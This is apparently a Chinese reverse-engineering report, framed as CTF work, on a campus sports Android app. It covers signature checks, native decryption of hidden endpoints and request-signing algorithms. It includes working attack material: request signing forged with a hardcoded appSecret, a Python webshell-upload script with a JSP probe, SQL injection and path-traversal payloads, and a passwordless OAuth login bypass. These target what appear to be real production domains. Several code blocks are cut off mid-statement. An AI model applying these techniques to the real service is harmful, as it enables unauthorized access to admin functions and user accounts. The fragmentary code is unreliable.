| 算法 | 结论 | 证据 |
|---|---|---|

### 3.3 auth() 证书校验链（防重打包根因）

```
aes_decrypt() 解密前 → auth() @0x3cf19c
  → getSignatureByte() @0x14a6ec
      反射: getPackageManager() → getPackageInfo() → signatures[0].toByteArray()
  → hashByteArray() 计算 MD5
  → strcmp 比对硬编码 "7F:C0:22:E6:7C:7D:2A:CC:C3:C8:77:0A:46:13:8D:C3"
```

- 硬编码指纹 = `META-INF/XIAOWEI.RSA` 中 X.509 证书 DER（**891 字节**）的 MD5 `7fc022e67c7d2accc3c8770a46138dc3`，**完全匹配**。
- 含义：任何重打包都会改变签名证书 → `auth()` 失败 → 连 AES 解密都跑不通。这解释了为什么免 Root 重打包 + frida-gadget 路线必然失败。

## 4. native 层新突破：Transform.k 破解与 41 条真实端点还原（本次核心成果）

### 4.1 问题定义

APK 的 Retrofit 接口注解全是**诱饵**，例如：

```java
@Test(demo = "785796286eb58ca15168713af4fce70c")
@POST("app/login")
Object D(@Query("username") String u, @Query("password") String p, ...);
```

`y/d.java` 中的拦截器逻辑：

```java
Test t = method.getAnnotation(Test.class);      // 取注解
String url = b0.b.l(context, t.demo());         // native 解密 demo 值
if (!url.startsWith("http://") && !url.startsWith("https://"))
    url = baseUrl + url;                        // 相对路径拼 baseUrl
request.newBuilder().url(url).build();          // 替换真实 URL
```

即：**`@Test(demo=…)` 的密文解密结果才是真实端点**，Retrofit 注解只是幌子。

### 4.2 破解过程（可复现）

1. **确认 native 入口**：`b0/b.java.l()` → `com.google.android.datatransport.Transform.k(context, hex)`。
2. **纯 Python AES 试解失败**：用 `AUTH_KEY` / `QR_CODE_KEY` / `SIGNATRUE_QZONE` 配合 CBC/ECB、IV=0、IV=key、反转密文、ASCII-hex 当 AES-256 密钥等 20+ 组合，锚点密文 `05dbfd8c595b3687f8351745f27c449b` 均解不出可打印内容 → 说明 `dz` 内部不是"裸 AES"，还叠加了 auth() 校验/预处理。
3. **静态定位 JNINativeMethod 表**：
   - `strings` 找到签名串：`(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;` @ 文件偏移 `0x3f2112`；
   - 自写 stdlib ELF 解析器（无需 pyelftools）：解析 PT_LOAD 得到 `off↔vaddr` 映射；全文件搜索 8 字节小端指针命中签名串 → 反查 `{name*, sig*, fn*}` 三联；
   - 结果：**20 个 native 方法**（`a,b,c,d,e,f,g,h,i,j,k,l,m,r,s,t,u,v,w,x`），其中 `k` 的签名正是 `(Context, String) → String`；
   - **反分析发现**：表项（文件偏移 `0x48f130`）的 `fnPtr` 字段静态为 0，且**无对应重定位**（`.rela.dyn` 中 9354 条 R_AARCH64_RELATIVE 均不覆盖它）→ 函数指针在 `JNI_OnLoad` 运行时填充。
4. **改用 dynsym 直接找实现**：`nm -D libtsnsecret.so` 符号零混淆，找到
   `_Z2dzP7_JNIEnvP8_jobjectS2_P8_jstring` @ **0x3d322c**，即 `dz(JNIEnv*, jobject, jobject context, jstring url)` —— 与 `Transform.k` 入参形状完全一致。
5. **动态验证**：新增 unidbg harness `TsnUrlHarness.java`，直接 `callFunction(OFF_DZ, env, thiz, ctx, jstring)`，把 `05dbfd8c…` 解出 `https://a.tsnkj.com/`（默认 schoolUrl 锚点命中）→ **闭环**。

### 7.4 签名算法（核心）

#### 基础签名 `getSign`（m.boxkj.com / 私版通用）

```python
def getSign(params: dict) -> str:
    params.pop("sign", None)
    params.update({"appId": self.appId, "appSecret": self.appSecret})
    concat = "&".join(f"{k}={params[k]}" for k in sorted(params.keys()))  # 值不做 URL 编码
    return md5(concat.encode()).hexdigest()
```

#### 加密签名 `getSign2`（`isOpenEncry` 学校的 getSetting / addSportRecord）

```python
md5_token = md5(token)
key, iv = md5_token[0:16], md5_token[16:32]

def enc(text):                       # AES-128-CBC + PKCS7 → base64
    return AES_CBC(key, iv).encrypt(text)

encrypt_appid    = md5(enc(appId + token + timestamp))
encrypt_secret   = md5(enc(token + timestamp))

params.pop("sign")
params.update({"appId": encrypt_appid, "appSecret": encrypt_secret})
concat = "&".join(f"{k}={params[k]}" for k in sorted(params.keys()))
sign = enc(concat)                   # 注意：getSign2 返回的是加密串，不是 MD5
```

## 9. CTF 攻击面与利用路径（零爆破）

### 9.0 前提与原则

- **禁止**：账号爆破、密码喷洒、目录大字典轰炸、并发压测（已验证会导致容器关闭）。
- **允许**：单次默认凭据尝试、签名伪造、已知漏洞精确验证、低速率小范围探测（≤1 req/s，目标路径 ≤50 条）。
- 所有请求模板中的 `TARGET` 必须替换为**赛事分配的靶场地址**，不得指向真实生产域名。

### 9.1 路径 A：m.boxkj.com `/admin/*` 应用级签名伪造（最高优先级）

**原理**：旧后台的 `/admin/*` 接口只校验“应用签名”（appId + appSecret），**不绑定用户 token**。APP 自身在登录前/后都以这种方式调用（版本检查、bug 日志上传）。由于 appSecret 硬编码在客户端，任何逆向者都能伪造合法请求 → **未授权访问管理命名空间**。

**已确认真实 `/admin/` 端点**：

| 端点 | 方法（推断） | 业务 | 利用方向 |
|---|---|---|---|
| `/admin/studentAppUpdate/stuAppVersion2` | POST（表单：schoolId、appSign） | 版本下发 | 参数注入、信息泄露、越权查看全校版本配置 |
| `/admin/userAppLogFile/addLogData` | POST（multipart） | 日志/反馈文件上传 | **文件上传 → webshell / 路径穿越 / 存储型 XSS** |
| `/admin/analysis/addUploadRecord`（2.0.16） | POST | 上传记录 | 同上（版本漂移，靶场可能仍存在） |

                  headers={"token": "x", "channel": "Android",
                           "version": "2.0.22", "type": "0"},
                  timeout=10, verify=False)

> 注意：`token` 头可填任意值（接口按代码逻辑不校验用户态）；若返回“未登录”，说明该端点确实校验 token，则改用路径 C。

**验证点**：
1. 不带 sign / 错误 sign → 是否返回签名错误（确认签名校验存在）；
2. 正确 sign → 是否返回业务数据（确认可绕过用户鉴权）；
3. 返回体是否包含管理端字段（schoolId 列表、版本号、下载 URL、日志 ID）。

**升级方向**：
- 用返回的字段做参数污染（`schoolId=1'`、`schoolId=1 or 1=1`）；
- 枚举 `/admin/` 下的常见控制器（小字典、低速）：`/admin/user/`、`/admin/sysUser/`、`/admin/role/`、`/admin/student/`、`/admin/teacher/`、`/admin/school/`、`/admin/log/`、`/admin/file/`、`/admin/upload/`；
- 若发现 `/admin/user/list` 之类接口，直接拉取管理员账号 → flag 到手。

### 9.2 路径 B：`addLogData` 文件上传

**原理**：APP 的 bugReport 通道把日志文件上传到 `/admin/userAppLogFile/addLogData`。若服务端：
- 未校验扩展名 → 传 `.jsp/.php/.war`；
- 未校验 Content-Type / 文件头 → 传 polyglot；
- 使用原始文件名且目录可访问 → 直接 getshell；
- 存在路径穿越（`filename=../../webapps/ROOT/x.jsp`）→ 任意写。

**请求模板**：

```python
import hashlib, requests

APPID, SECRET = "move", "e8167ef026cbc5e456ab837d9d6d9254"
fields = {"userId": "1", "appVersion": "2.0.22"}
p = dict(fields); p.update({"appId": APPID, "appSecret": SECRET})
p["sign"] = hashlib.md5("&".join(f"{k}={p[k]}" for k in sorted(p)).encode()).hexdigest()

files = {"file": ("probe.jsp", b"<% out.print(31337*3); %>", "image/png")}

                  data=p, files=files,
                  headers={"token": "x", "channel": "Android", "version": "2.0.22", "type": "0"},
                  timeout=10)
print(r.status_code, r.text[:500])
```

**判定标准**：
- 返回体含可访问 URL / 文件路径 → 直接访问验证解析；
- 返回“文件类型不允许” → 换扩展名/双扩展名/大小写/MIME；
- 返回 500 且报文含堆栈 → 记录（信息泄露 + 可能的路径穿越）。

> 只做**一次**探针上传（非批量），避免触发容器保护。

import base64, requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def enc_pwd(pwd: str) -> str:

    data = pwd.encode()
    data += b"\x00" * (16 - len(data) % 16) # ZeroPadding
    c = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return base64.b64encode(c.update(data) + c.finalize()).decode()

### 13.2 `oldtsn` 免密登录链（最高优先级，服务端认证绕过候选）

**完整调用链（实锤）：**

```java
// H5AppActivity.s()
if (intent.hasExtra("username")) {
    b.a().W0(intent.getStringExtra("username"));      // 设置账号
    if (url != null) {
        String school = Uri.parse(url).getQueryParameter("school");
        b.a().M0(String.valueOf(school));              // 设置学校
        ((H5VM) C()).X();                              // ← 触发 oldtsn 登录
    }
}

// H5VM.X() → o0.a.a(LoginUser.getAccount())
// o0.a.a(account) → b.m(...) → b.x(account, grant_type="password", type="oldtsn")
// b.x → POST auth/oauth/token（Retrofit 诱饵写的是 app/login）
```

**关键事实：**

- `b.x()` 的参数只有 `username`、`grant_type`、`type`，**没有 password**。
- `type="oldtsn"` 是“老系统账号迁移登录”分支。
- `H5AppActivity` 未导出（无 intent-filter），但可由应用内部 H5/推送/扫码/其他组件携带 extras 拉起。
- 若服务端对 `type=oldtsn` 只按用户名签发 token，则**任意用户名免密登录**。

**单次验证请求（仅靶场）：**

```http
POST https://TARGET/auth/oauth/token
Authorization: Basic base64(<schoolCode>:pig)
Content-Type: application/x-www-form-urlencoded

username=admin&grant_type=password&type=oldtsn&appType=stuApp
```

**判定：**
- 返回 `access_token` → 认证绕过成立，直接拿管理员 token；
- 返回 `invalid_grant` / “密码不能为空” → 该分支在服务端被校验，转 13.3/13.4；
- 返回 401 且提示用户不存在 → 需要先枚举有效用户名（见 13.3）。
